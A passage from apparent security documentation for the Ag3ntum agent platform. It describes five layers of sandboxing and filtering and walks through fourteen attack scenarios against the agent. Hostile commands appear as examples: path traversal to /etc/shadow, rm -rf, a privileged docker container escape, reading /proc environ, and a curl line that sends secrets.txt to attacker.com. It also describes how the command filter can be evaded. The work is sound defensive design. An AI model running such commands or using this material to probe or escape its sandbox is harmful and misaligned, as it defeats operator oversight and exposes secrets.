   - **`mcp__ag3ntum__Write`** - Write/create files
   - **`mcp__ag3ntum__Edit`** - Edit existing files
   - **`mcp__ag3ntum__LS`** - List directory contents
   - **`mcp__ag3ntum__Glob`** - Find files by pattern
   - **`mcp__ag3ntum__Grep`** - Search file contents
   
   ### Command Execution
   - **`mcp__ag3ntum__Bash`** - Execute shell commands with sandboxing
   
   **Do NOT use** native `Read`, `Write`, `Edit`, `Bash`, etc. - they are blocked.
   ```

3. **Path Security Instructions**
   
   ```markdown
   ## File System & Path Security
   
   **Ag3ntum Tools Required**: All file operations MUST use Ag3ntum MCP tools.
   
   **Absolute Paths Forbidden**: NEVER use absolute paths like `/etc/passwd`.
   
   **Relative Paths Only**: Use paths like `./data/file.txt` or `/workspace/file.txt`.
   
   **Workspace Confinement**: You may only access files within the workspace (`.`).
   
   **Skills Directory**: `./.claude/skills/` is READ-ONLY. Do not attempt to write to it.
   ```

### What It Enforces (Soft)

The prompt **guides** the agent to:
- ✅ Use relative paths: `./file.txt`, `./data/output.json`
- ✅ Use Ag3ntum MCP tools: `mcp__ag3ntum__Read`, not `Read`
- ❌ Avoid absolute paths: `/etc/passwd`, `/tmp/file.txt`
- ❌ Avoid parent traversal: `../../../secrets.yaml`

### Limitations

**⚠️ Prompt-based security is NOT reliable:**

1. **Jailbreaking:** Attackers can craft prompts that bypass instructions
2. **Model Limitations:** The AI may misunderstand or ignore instructions
3. **Emergent Behavior:** Complex prompts may lead to unexpected behavior

**Why We Still Use It:**

- **First Line of Defense:** Reduces accidental violations
- **User Experience:** Well-behaved agent is more helpful
- **Defense-in-Depth:** If prompt fails, layers 1-4 still protect

**Ag3ntum Philosophy:** **Never trust the prompt.** Layers 1-4 provide **technical enforcement** that cannot be bypassed through prompt manipulation.

---

---

## Real-World Example: User greg Tries to Read `/etc/passwd`

Let's trace what happens when user `greg` asks: "Read the file `/etc/passwd`"

### Scenario 1: Agent Tries Native `Read` Tool

**Request:** `Read(/etc/passwd)`

```
Layer 5 (Prompt): Agent guided to use Ag3ntum tools
├─ Likely outcome: Agent uses mcp__ag3ntum__Read instead
└─ If agent ignores: Continue...

SDK Tool Resolution:
├─ Tool: Read
├─ Check: Is Read in tools.disabled? ✓ YES
└─ Result: ❌ BLOCKED (native tool disabled)

Agent receives message:
  "Tool Read is disabled. Use mcp__ag3ntum__Read instead."
```

### Scenario 2: Agent Uses Ag3ntum Tool with Absolute Path

**Request:** `mcp__ag3ntum__Read(/etc/passwd)`

```
Layer 5 (Prompt): Agent guided to use relative paths
├─ If agent ignores: Continue to Layer 3...

Layer 3 (Ag3ntumRead with PathValidator):
├─ Input path: /etc/passwd
├─ Normalize: /etc/passwd (absolute, not /workspace prefix)
├─ Check workspace boundary:
│   ├─ Is /etc/passwd under /users/greg/sessions/xxx/workspace? ✗ NO
│   └─ Result: ❌ PathValidationError("Path outside workspace")
└─ Result: ❌ BLOCKED

Agent receives:
  "Path validation error: Path outside workspace. 
   Use relative paths (./file.txt) or /workspace paths."
```

### Scenario 3: Agent Tries Parent Traversal

**Request:** `mcp__ag3ntum__Read(../../../etc/passwd)`

```
Layer 5 (Prompt): Agent guided not to use `..` traversal
├─ If agent ignores: Continue to Layer 3...

Layer 3 (Ag3ntumRead with PathValidator):
├─ Input path: ../../../etc/passwd
├─ Normalize (resolve from workspace):
│   /users/greg/sessions/xxx/workspace + ../../../etc/passwd
│   → /users/greg/etc/passwd (resolves outside workspace)
├─ Check workspace boundary:
│   ├─ Is /users/greg/etc/passwd under /workspace/? ✗ NO
│   └─ Result: ❌ PathValidationError("Path outside workspace")
└─ Result: ❌ BLOCKED

Agent receives:
  "Path validation error: Path outside workspace."
```

### Scenario 4: Agent Reads Valid Workspace File

**Request:** `mcp__ag3ntum__Read(./data/file.txt)`

```
Layer 5 (Prompt): ✓ PASS (relative path, Ag3ntum tool)

Layer 3 (Ag3ntumRead with PathValidator):
├─ Input path: ./data/file.txt
├─ Normalize: /users/greg/sessions/xxx/workspace/data/file.txt
├─ Check workspace boundary: ✓ YES (within workspace)
├─ Check blocklist (*.env, *.key): ✗ NO MATCH
├─ Check read-only (.claude/skills/): ✗ NO (not in .claude/skills)
└─ Result: ✓ ALLOWED

File Read:
├─ Path: /users/greg/sessions/xxx/workspace/data/file.txt
├─ File exists? ✓ YES
└─ Result: ✓ Content returned

Final Result: ✅ SUCCESS
```

### Scenario 5: Agent Runs Command via Ag3ntumBash

**Request:** `mcp__ag3ntum__Bash(ps aux)` (list all processes)

```
Layer 5 (Prompt): Agent guided on safe command usage
├─ If agent ignores: Continue to Layer 4...

Layer 4 (Command Security Filter):
├─ Input command: "ps aux"
├─ Check regex patterns: Process introspection patterns
├─ Result: ✓ ALLOWED (ps is not blocked for basic info gathering)
└─ Continue to Layer 3...

Layer 3 (Ag3ntumBash): Tool receives command

Layer 2 (Bubblewrap Sandbox):
├─ Wrap command in bwrap with PID namespace isolation
├─ Execute: bwrap --unshare-pid ... -- bash -c "ps aux"
├─ Result: ps shows ONLY sandbox processes (bash, ps)
│   └─ Cannot see host processes or other sessions
└─ Result: ✓ Command executes (with limited visibility)

Final Result: ✅ SUCCESS (but output limited to sandbox)
```

**Key Point:** Commands execute within the **sandboxed environment**. The agent can only see its own processes due to PID namespace isolation and filtered `/proc`.

### Scenario 6: Agent Tries to Modify Skills

**Request:** `mcp__ag3ntum__Write(./.claude/skills/devops/script.py, "malicious code")`

```
Layer 5 (Prompt): Agent instructed skills are read-only
├─ If agent ignores: Continue to Layer 3...

Layer 3 (Ag3ntumWrite with PathValidator):
├─ Input path: ./.claude/skills/devops/script.py
├─ Normalize: /users/greg/sessions/xxx/workspace/.claude/skills/devops/script.py
├─ Check workspace boundary: ✓ YES
├─ Check blocklist: ✗ NO MATCH
├─ Check read-only (.claude/skills/):
│   ├─ Is path under .claude/skills/? ✓ YES
│   ├─ Operation: write
│   └─ Result: ❌ PathValidationError("Read-only path")
└─ Result: ❌ BLOCKED

Agent receives:
  "Path validation error: .claude/skills/ is read-only."
```

**Backup Protection (Layer 2):** Even if PathValidator had a bug, the actual skill directories are mounted read-only by Bubblewrap:
```bash
bwrap ... --ro-bind /skills/.claude/skills /skills/.claude/skills ...
# Symlinks resolve to read-only mounts → Write fails at OS level
```

---

## How Layers Work Together

### Example: greg Creates a Script and Runs It

**Task:** "Create a Python script that prints 'Hello' and run it"

#### Step 1: Create Script

**Agent Action:** `mcp__ag3ntum__Write(./hello.py, content="print('Hello')")`

```
Layer 5 (Prompt): ✓ PASS (guided to use Ag3ntum tools)
Layer 4 (Command Filter): N/A (not a Bash command)
Layer 3 (Ag3ntumWrite with PathValidator):
  ├─ Normalize: ./hello.py → /users/greg/sessions/.../workspace/hello.py
  ├─ Check workspace: ✓ YES
  ├─ Check blocklist: ✓ NOT BLOCKED
  ├─ Check read-only: ✓ NOT IN .claude/skills/
  └─ Write file: ✓ SUCCESS
Layer 2: N/A (Ag3ntumWrite runs in Python process, no bwrap)
Layer 1 (Docker): Container filesystem
  └─ ✓ SUCCESS (file created)

Result: ✅ File created at /users/greg/sessions/.../workspace/hello.py
```

#### Step 2: Run Script

**Agent Action:** `mcp__ag3ntum__Bash(python ./hello.py)`

```
Layer 5 (Prompt): ✓ PASS (guided to use Ag3ntumBash)
Layer 4 (Command Security Filter):
  ├─ Input command: "python ./hello.py"
  ├─ Check regex patterns: No dangerous patterns matched
  └─ Result: ✓ ALLOWED
Layer 3 (Ag3ntumBash): Tool receives command
Layer 2 (Bubblewrap Sandbox):
  ├─ Build bwrap command:
  │   bwrap --unshare-pid --unshare-uts --unshare-ipc \
  │         --bind /workspace /workspace \
  │         --ro-bind /skills/.claude/skills /skills/.claude/skills \
  │         --ro-bind /usr /usr --ro-bind /lib /lib \
  │         --chdir /workspace \
  │         -- bash -c "python ./hello.py"
  ├─ Execute in sandbox
  └─ Capture output: "Hello"
Layer 1 (Docker): Container filesystem
  └─ ✓ SUCCESS

Output: "Hello"
Result: ✅ Script executed successfully
```

**Key Points:**
- File operations use `mcp__ag3ntum__Write` with PathValidator (Layer 3)
- Command execution uses `mcp__ag3ntum__Bash` with Command Filter (Layer 4) + Bubblewrap (Layer 2)
- Native Claude Code tools (`Write`, `Bash`) are blocked
- Command Security Filter blocks dangerous commands before execution (Layer 4)
- PathValidator ensures workspace confinement for Python file operations (Layer 3)
- Bubblewrap ensures mount namespace isolation for subprocesses (Layer 2)
- Prompt guides agent behavior but doesn't enforce security (Layer 5)

---

## Audit and Observability

### Logging Levels

| Layer | Event | Log Level | Example |
|-------|-------|-----------|---------|
| 1 (Docker) | Container start | INFO | `Container ag3ntum-api started` |
| 2 (Bwrap) | Sandbox wrap | INFO | `SANDBOX: Wrapping Bash command in bwrap` |
| 2 (Bwrap) | Sandbox error | ERROR | `SANDBOX ERROR: bwrap exited with code 1` |
| 3 (Tools) | Permission check | INFO | `PERMISSION CHECK: Read with input: {'target_file': './file.txt'}` |
| 3 (Tools) | Permission denial | INFO | `PERMISSION DENIAL: Read denied` |
| 3 (Tools) | Path validation | INFO | `PathValidator: Validated ./file.txt → /workspace/file.txt` |
| 3 (Tools) | Path blocked | WARNING | `PathValidator: BLOCKED path outside workspace` |
| 4 (Prompt) | N/A | N/A | (Agent behavior not logged directly) |

### Audit Trail for greg's Session

**Session:** `20260110_103413_6903525c`

**Logs:**
```
[2026-01-10 10:34:13] INFO: Created session: 20260110_103413_6903525c for user: greg (uuid-greg-1234)
[2026-01-10 10:34:14] INFO: SANDBOX: Enabled file_sandboxing=True network_sandboxing=True
[2026-01-10 10:34:15] INFO: Agent started for session: 20260110_103413_6903525c
[2026-01-10 10:34:16] INFO: PathValidator: Validating path ./data/file.txt for read
[2026-01-10 10:34:16] INFO: PathValidator: ALLOWED /workspace/data/file.txt (within workspace)
[2026-01-10 10:34:17] INFO: SANDBOX EXEC: bwrap --unshare-pid --unshare-uts ...
[2026-01-10 10:34:18] INFO: SANDBOX RESULT: exit=0, stdout_len=1234
[2026-01-10 10:34:20] INFO: Ag3ntumBash: Executing 'python script.py' in sandbox
[2026-01-10 10:34:21] INFO: SANDBOX RESULT: exit=0, stdout="Hello World"
```

**Session Files:**
```
users/greg/sessions/20260110_103413_6903525c/
├── agent.jsonl              # Full execution trace (tool calls, responses)
├── session_info.json        # Metadata (status, timestamps)
└── workspace/
    ├── output.yaml          # Task results
    └── data/
        └── file.txt         # User files
```

---

## Security Boundaries Summary

| Boundary | Trust Level | What Crosses | Protection |
|----------|-------------|--------------|------------|
| **Host ↔ Docker** | Host is trusted | Volume mounts, network | Container isolation, user separation |
| **Docker ↔ Bwrap** | Docker is trusted | Bind mounts | Namespace isolation, mount restrictions |
| **Bwrap ↔ Subprocess** | Subprocess is **UNTRUSTED** | Commands, file paths | Bubblewrap sandbox (Ag3ntumBash) |
| **Python ↔ Agent** | Agent is **UNTRUSTED** | Tool calls, file paths | Command Filter + PathValidator (Ag3ntum tools) |
| **Agent ↔ User** | User is trusted | API requests, authentication | JWT validation, session ownership |

**Critical Insight:** The **agent is untrusted**. Security is enforced at:
1. **OS level** (Docker + Bubblewrap) - Subprocess isolation
2. **Application level** (Command Filter + PathValidator) - Pre-execution filtering + Python file operation validation
3. **Tool level** (blocked native tools) - Native Claude Code tools disabled

---

## Attack Scenarios and Mitigations

### Attack 1: Process Termination via `kill`

**Attacker Goal:** Terminate the agent process using `mcp__ag3ntum__Bash(kill -9 147)`

**Mitigation:**
1. Layer 5 (Prompt): Instructs against process termination
2. Layer 4 (Command Filter): Regex pattern matches `kill -9 147` → **BLOCKED**
3. Layer 2 (Bubblewrap backup): PID namespace isolation (backup if filter bypassed)

**Result:** ❌ BLOCKED (Layer 4 - Command Security Filter)

**Command never reaches execution** - blocked at application level before Bubblewrap.

---

### Attack 2: Path Traversal via `../`

**Attacker Goal:** Read `/etc/shadow` using `mcp__ag3ntum__Read(../../../../etc/shadow)`

**Mitigation:**
1. Layer 5 (Prompt): Instructs against `..` usage
2. Layer 3 (PathValidator): Path resolves outside workspace → **BLOCKED**
3. Layer 2 (Bubblewrap): `/etc` not mounted (backup for Bash commands)

**Result:** ❌ BLOCKED (Layer 3 - PathValidator)

---

### Attack 3: Using Blocked Native Tool

**Attacker Goal:** Use native `Bash(sudo apt install malware)`

**Mitigation:**
1. SDK Tool Resolution: Native `Bash` is in `tools.disabled`
2. Tool not available to agent

**Result:** ❌ BLOCKED (tool disabled)

---

### Attack 4: Container Escape via `docker`

**Attacker Goal:** Run `mcp__ag3ntum__Bash(docker run --privileged -it ubuntu)`

**Mitigation:**
1. Layer 5 (Prompt): Guidance against dangerous commands
2. Layer 4 (Command Filter): Pattern matches container escape attempts → **BLOCKED**
3. Layer 2 (Bubblewrap backup): PID namespace isolation, limited /proc access
4. Layer 1 (Docker backup): Docker socket not mounted in container

**Result:** ❌ BLOCKED (Layer 4 - Command Security Filter)

**Defense-in-Depth:** Even if command filter bypassed, Docker socket is not available.

---

### Attack 5: Process Introspection via `ps`

**Attacker Goal:** Run `mcp__ag3ntum__Bash(ps aux)` to discover running processes

**Attack Attempt:**
```bash
agent> ps aux
fatal library error, lookup self  # Tool fails (expected)

agent> ls /proc | grep -E "^[0-9]+$"
(no output - 0 PIDs visible)  # ✓ Process enumeration blocked
```

**Mitigation Layers:**
1. Layer 2 (Bubblewrap): Filtered `/proc` with `--tmpfs /proc`
2. Only safe entries bind-mounted: `/proc/self`, `/proc/cpuinfo`, etc.
3. Process PID directories (`/proc/[0-9]+/`) are NOT mounted

**Result:** ❌ **BLOCKED** - `ps` command fails because it cannot enumerate `/proc/[pid]/` directories

**Security Impact:**
- 0 process PIDs exposed to the agent
- Process environments cannot be read (prevents API key and secret leakage)

---

### Attack 6: Destructive Operations via `rm -rf`

**Attacker Goal:** Delete all files using `mcp__ag3ntum__Bash(rm -rf /workspace)`

**Mitigation:**
1. Layer 5 (Prompt): Instructs against destructive operations
2. Layer 4 (Command Filter): Pattern matches `rm -rf` → **BLOCKED**
3. Layer 2 (Bubblewrap backup): Limited filesystem view (backup if filter bypassed)

**Result:** ❌ BLOCKED (Layer 4 - Command Security Filter)

**Command never executes** - blocked before reaching the sandbox.

---

### Attack 7: Sandbox Bypass via SDK Flag

**Attacker Goal:** Use `dangerouslyDisableSandbox=True` in tool input

**Mitigation:**
1. Layer 3 (Ag3ntumBash): Tool ignores this flag; sandbox is mandatory
2. Bubblewrap wrapping cannot be disabled from tool input

**Result:** ❌ IGNORED (flag has no effect in Ag3ntum tools)

---

### Attack 8: Skill Tampering

**Attacker Goal:** Modify `./.claude/skills/devops/script.sh` to inject malicious code

**Mitigation:**
1. Layer 5 (Prompt): Instructs skills are read-only
2. Layer 3 (PathValidator): `.claude/skills/` is in `readonly_prefixes` → write blocked
3. Layer 2 (Bubblewrap): Actual skill directories mounted read-only (`--ro-bind`)

**Result:** ❌ BLOCKED (Layer 3 - PathValidator, backed by Layer 2)

```bash
# Even if PathValidator had a bug, symlinks point to read-only mounts:
$ echo x > /workspace/.claude/skills/devops/script.sh
bash: .../script.sh: Read-only file system
```

---

### Attack 9: Network Data Exfiltration

**Attacker Goal:** Run `mcp__ag3ntum__Bash(curl http://attacker.com --data-binary @./secrets.txt)`

**Mitigation:**
1. Layer 5 (Prompt): Guidance against suspicious network behavior
2. Layer 4 (Command Filter): Data exfiltration patterns can be detected
3. Layer 2 (Bubblewrap): Network access controlled by `network.enabled` config
4. File `./secrets.txt` must exist in workspace and not match blocklist

**Result:** ⚠️ **PARTIALLY MITIGATED** - Command may execute if network is enabled and not caught by filter. Use `mcp__ag3ntum__WebFetch` for controlled outbound access with domain blocklist.

**Recommendation:** Use `mcp__ag3ntum__WebFetch` instead of shell `curl`; it has domain blocklist enforcement.

---

### Attack 10: Symbolic Link Attack

**Attacker Goal:** Create symlink `./evil -> /etc/shadow`, then `mcp__ag3ntum__Read(./evil)`

**Mitigation:**
1. Layer 3 (PathValidator): Resolves symlink target before validation
2. Resolved path `/etc/shadow` is outside workspace → **BLOCKED**
3. Layer 2 (Bubblewrap backup): `/etc/shadow` not mounted anyway

**Result:** ❌ BLOCKED (Layer 3 - PathValidator resolves symlinks)

---

### Attack 11: Read Sensitive Files in Workspace

**Attacker Goal:** Read `mcp__ag3ntum__Read(./.env)` containing secrets

**Mitigation:**
1. Layer 3 (PathValidator): `.env` matches blocklist pattern `*.env`
2. File blocked even though it's within workspace

**Result:** ❌ BLOCKED (Layer 3 - PathValidator blocklist)

---

### Attack 12: Environment Variable Leakage via Own Process

**Attacker Goal:** Run `mcp__ag3ntum__Bash(env)` to dump environment variables

**Mitigation:**
1. Layer 2 (Bubblewrap): Environment cleared with `--clearenv`
2. Only `HOME=/workspace` and `PATH=/usr/bin:/bin` are set

**Result:** ✅ EXECUTES but environment is **minimal**:
```
HOME=/workspace
PATH=/usr/bin:/bin
```

**No secrets leaked** (environment is cleared by Bubblewrap).

---

### Attack 13: Environment Leakage via Other Processes

**Attacker Goal:** Read environment variables from other processes to find secrets

**Attack Attempt:**
```bash
# Try to read main API process environment
agent> cat /proc/1/environ
cat: /proc/1/environ: No such file or directory  # ✓ Blocked
```

**Mitigation:**
1. Layer 2 (Bubblewrap): `/proc/[0-9]+/` directories not mounted
2. Only `/proc/self/` is accessible (own process, which has minimal env)
3. Filtered `/proc` prevents access to other processes entirely

**Result:** ❌ **BLOCKED** - Cannot access other processes' `/proc/[pid]/` directories

**Security Impact:**
- **HIGH** - Prevents leakage of API keys, database credentials, tokens stored in environment variables
- Prevents information disclosure that could lead to privilege escalation

---

### Attack 14: Process Command Line Introspection

**Attacker Goal:** Read process command lines to gather intelligence about running services

**Attack Attempt:**
```bash
# Enumerate all process command lines
agent> for pid in $(ls /proc | grep -E "^[0-9]+$"); do cat /proc/$pid/cmdline; echo; done
(no output - ls /proc returns 0 PIDs)
```

**Mitigation:**
1. Layer 2 (Bubblewrap): Process PID directories not mounted in `/proc`
2. `ls /proc | grep -E "^[0-9]+$"` returns empty (0 PIDs)
3. Cannot iterate over processes

**Result:** ❌ **BLOCKED** - Process enumeration fails at first step (no PIDs visible)

**Security Impact:**
- Prevents reconnaissance of running services
- Hides potentially sensitive command-line arguments (passwords, tokens, file paths)

---

## Configuration Best Practices

### For Administrators

1. **Enable All Security Layers:**
   ```yaml
   # permissions.yaml
   sandbox:
     enabled: true
     file_sandboxing: true
     network_sandboxing: true
   ```

2. **Block Native Claude Code Tools:**
   ```yaml
   tools:
     enabled:
       - mcp__ag3ntum__Read
       - mcp__ag3ntum__Write
       - mcp__ag3ntum__Bash
       # ... other Ag3ntum tools
     disabled:
       - Bash      # Block native tools
       - Read
       - Write
       - Edit
       # ... all native file/command tools
   ```

3. **Configure PathValidator Blocklist:**
   ```yaml
   # config/tools_security.yaml
   path_validator:
     blocklist:
       - "*.env"
       - "*.key"
       - ".git/**"
       - "__pycache__/**"
     readonly_prefixes:
       - ".claude/skills/"
   ```

4. **Configure Network Blocklist (for WebFetch):**
   ```yaml
   # config/tools_security.yaml
   network:
     blocked_domains:
       - "localhost"
       - "127.0.0.1"
       - "169.254.169.254"  # AWS metadata
   ```

5. **Audit Session Logs:**
   ```bash
   # Check for security blocks and path validation errors
   grep -E "PathValidationError|SANDBOX|BLOCKED" logs/backend.log
   ```

### For Users (like greg)

1. **Use Ag3ntum MCP Tools:**
   - ✅ `mcp__ag3ntum__Read`, `mcp__ag3ntum__Write`
   - ❌ Native `Read`, `Write`, `Bash` (blocked)

2. **Use Relative Paths:**
   - ✅ `./file.txt`, `./data/output.json`, `/workspace/file.txt`
   - ❌ `/etc/passwd`, `../../../secrets.yaml`

3. **Respect Read-Only Areas:**
   - ✅ Read from `./.claude/skills/`
   - ❌ Write to `./.claude/skills/`

4. **Trust the Security System:**
   - If a path is blocked, there's a reason
   - Check PathValidationError messages for guidance
   - Ask for help if confused

5. **Report Suspicious Behavior:**
   - If the agent tries to bypass security, report it
   - Example: "The agent tried to access files outside workspace"

---

## Known Limitations

### Layer 1 (Docker)

- ⚠️ **Kernel exploits:** Container escape via kernel vulnerabilities (rare)
- ⚠️ **Volume mounts:** Misconfigured mounts can expose host files

### Layer 2 (Bubblewrap)

- ⚠️ **Network isolation incomplete:** `--unshare-net` disabled in Docker (nested container limitation)
- ⚠️ **User namespace:** bwrap runs as same user (not UID-altered in current config)
- ⚠️ **Only applies to Ag3ntumBash:** Python file tools (Ag3ntumRead, etc.) don't use bwrap

### Layer 3 (Ag3ntum Tools + PathValidator)

- ⚠️ **PathValidator bugs:** Incorrect path resolution or boundary checking
- ⚠️ **Race conditions:** Time-of-check to time-of-use (TOCTOU) vulnerabilities
- ⚠️ **Symlink handling:** Must resolve symlinks before validation (implemented)
- ⚠️ **Incomplete blocklist:** New sensitive patterns may not be covered
- ⚠️ **Python process access:** File tools run in Python process, not sandboxed at OS level

### Layer 4 (Command Security Filter)

- ⚠️ **Regex evasion:** Attackers may craft commands to bypass patterns
- ⚠️ **Incomplete coverage:** New attack vectors may not be covered by existing 100+ patterns
- ⚠️ **Command chaining:** Shell features like `&&`, `||`, `;` may bypass single-command checks
- ⚠️ **Encoding attacks:** Base64, hex, or other obfuscation (mitigated by dedicated patterns)
- ⚠️ **Only applies to Ag3ntumBash:** File tools don't go through command filter

### Layer 5 (Prompts)

- ⚠️ **Jailbreaking:** Prompt manipulation can bypass instructions
- ⚠️ **Model limitations:** AI may misunderstand or ignore prompts
- ⚠️ **Not a security control:** Prompts are guidance, not enforcement
- ⚠️ **Social engineering:** Agent may be manipulated by user input

### General

- ⚠️ **No network isolation:** Ag3ntumBash commands can access network if enabled
- ⚠️ **No resource limits:** No CPU/memory limits on subprocess execution (can be added via cgroups)

---

## Conclusion

Ag3ntum's **five-layer security model** provides robust protection through **defense-in-depth**.

**Architecture Overview:**

| Layer | Component | Scope | Enforcement |
|-------|-----------|-------|-------------|
| 1 | Docker | Host isolation | Container boundary |
| 2 | Bubblewrap | Subprocess isolation | Mount namespace (Ag3ntumBash) |
| 3 | Ag3ntum Tools | File operations | PathValidator (Python tools) |
| 4 | Command Filter | Command validation | Regex-based pre-execution (Ag3ntumBash) |
| 5 | Prompts | Agent guidance | Soft enforcement |

**Key Takeaways for User greg:**

1. **Your files are protected** by OS-level sandboxing and path validation
2. **Dangerous commands are blocked** by regex-based pre-execution filtering (100+ patterns)
3. **The agent uses custom tools** (`mcp__ag3ntum__*`) with built-in security
4. **Native Claude Code tools are blocked** - cannot bypass Ag3ntum security
5. **Subprocesses are sandboxed** - cannot see host filesystem
6. **You can trust the system**, but should still report suspicious behavior

**For Developers:**

1. **Security at the right level:** Command filter + OS for commands, Python for file operations
2. **Fail-closed by default:** If PathValidator or Command Filter fails, deny the operation
3. **Log everything:** Audit trails enable incident response
4. **Configure blocklists:** Update `config/tools_security.yaml` and `config/security/command_filtering.yaml` for new threats
5. **Test bypass scenarios:** Use `scripts/ag3ntum_debug.py` and `pytest tests/security/` for security testing

**Next Steps:**

- Review configuration: `config/permissions.yaml`, `config/tools_security.yaml`
- Audit session logs: `logs/backend.log`
- Test security: Run `scripts/ag3ntum_debug.py` with attack scenarios
- Review PathValidator: `src/core/path_validator.py`

---

## References

### Documentation

- [Current Architecture](./current_architecture.md) - System architecture diagram
- [Current Bwrap](./current_bwrap.md) - Bubblewrap sandbox details
- [How to Debug](./how-to-debug-agent-with-ag3ntum_debug.md) - Security testing guide

### Configuration Files

- `config/permissions.yaml` - Tool enablement and sandbox config
- `config/tools_security.yaml` - PathValidator and network blocklists
- `config/security/command_filtering.yaml` - Command Security Filter rules (100+ patterns, 16 categories)
- `prompts/modules/security.j2` - Security prompt module
- `prompts/modules/tools.j2` - Tool usage guidance

### Source Code

- `src/core/agent_core.py` - Main agent execution, tool registration
- `src/core/task_runner.py` - Unified task execution entry point
- `src/core/sandbox.py` - Bubblewrap sandbox executor (`SandboxConfig`, `SandboxExecutor`)
- `src/core/path_validator.py` - `Ag3ntumPathValidator` for file tool security
- `src/core/command_security.py` - `CommandSecurityFilter` for dangerous command blocking
- `src/core/permissions.py` - Permission callback handler
- `src/core/permission_profiles.py` - Profile management and session context
- `src/services/agent_runner.py` - HTTP API agent execution
- `tools/ag3ntum/ag3ntum_bash/` - Ag3ntumBash MCP tool (with Command Filter + bwrap)
- `tools/ag3ntum/ag3ntum_read/` - Ag3ntumRead MCP tool (with PathValidator)
- `tools/ag3ntum/ag3ntum_write/` - Ag3ntumWrite MCP tool (with PathValidator)
- `tools/ag3ntum/` - All Ag3ntum MCP tool implementations

### Testing

- `scripts/ag3ntum_debug.py` - CLI debugging tool for security testing
- `tests/security/test_command_security.py` - Command Security Filter test suite (101 tests)

### External Resources

- [Bubblewrap](https://github.com/containers/bubblewrap) - Sandboxing tool
- [Docker Security](https://docs.docker.com/engine/security/) - Container isolation
- [Linux Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html) - Kernel isolation features
